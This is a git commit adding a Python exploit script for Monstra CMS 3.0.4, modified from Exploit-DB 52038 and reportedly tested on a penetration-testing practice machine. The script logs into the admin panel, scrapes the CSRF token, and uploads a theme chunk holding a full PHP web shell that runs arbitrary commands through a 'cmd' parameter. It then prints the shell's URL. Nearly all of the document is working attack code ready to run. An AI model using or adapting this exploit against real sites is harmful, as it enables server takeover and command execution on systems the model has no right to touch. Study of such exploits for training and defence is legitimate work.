73ba1e1875455999bbb6d603e0753d4531b27424
wcheng729 <139577034+wcheng729@users.noreply.github.com>
2025-04-04 16:14:59 +0800

    Create monstra-rce.py
    The is a modified exploit from exploitdb 52038.
    Already tested against monstra 3.0.4 version from offsec PG practice machine monster. 
    This exploit abuse the function of theme adding on the administration panel, by adding a input field with php code, we can create a webshell on the theme directory.

---
+++ monstra-rce.py
@@ -0,0 +1,87 @@
+# Exploit Title: Monstra CMS 3.0.4 - Remote Code Execution (RCE)
+# Version: 3.0.4
+# This is the modified version from exploitdb - EDB-ID:52038
+# https://www.exploit-db.com/exploits/52038
+
+import requests
+import random
+import string
+import time
+import re
+import sys
+
+if len(sys.argv) < 4:
+    print("Usage: python3 script.py <url> <username> <password>")
+    sys.exit(1)
+
+base_url = sys.argv[1]
+username = sys.argv[2]
+password = sys.argv[3]
+
+session = requests.Session()
+
+login_url = f'{base_url}/admin/index.php?id=dashboard'
+login_data = {
+'login': username,
+'password': password,
+'login_submit': 'Log+In'
+}
+
+filename = ''.join(random.choices(string.ascii_lowercase + string.digits, k=
+5))
+
+print("Logging in...")
+response = session.post(login_url, data=login_data)
+
+if 'Dashboard' in response.text:
+    print("Login successful")
+else:
+    print("Login failed")
+    exit()
+
+time.sleep(3)
+
+edit_url = f'{base_url}/admin/index.php?id=themes&action=add_chunk'
+response = session.get(edit_url) # CSRF token bulmak için edit sayfasınaerişim
+
+token_search = re.search(r'''input type="hidden" id="csrf" name="csrf" value="(.*?)"''', response.text)
+if token_search:
+    token = token_search.group(1)
+else:
+    print("CSRF token could not be found.")
+    exit()
+
+content = '''
+<html>
+<body>
+<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
+<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
+<input type="SUBMIT" value="Execute">
+</form>
+<pre>
+<?php
+if(isset($_GET['cmd']))
+{
+system($_GET['cmd']);
+}
+?>
+</pre>
+</body>
+</html>
+'''
+
+edit_data = {
+'csrf': token,
+'name': filename,
+'content': content,
+'add_file': 'Save'
+}
+
+print("Preparing shell...")
+response = session.post(edit_url, data=edit_data)
+time.sleep(3)
+
+if response.status_code == 200:
+    print(f"Your shell is ready: {base_url}/public/themes/default/{filename}.chunk.php")
+else:
+    print("Failed to prepare shell.")
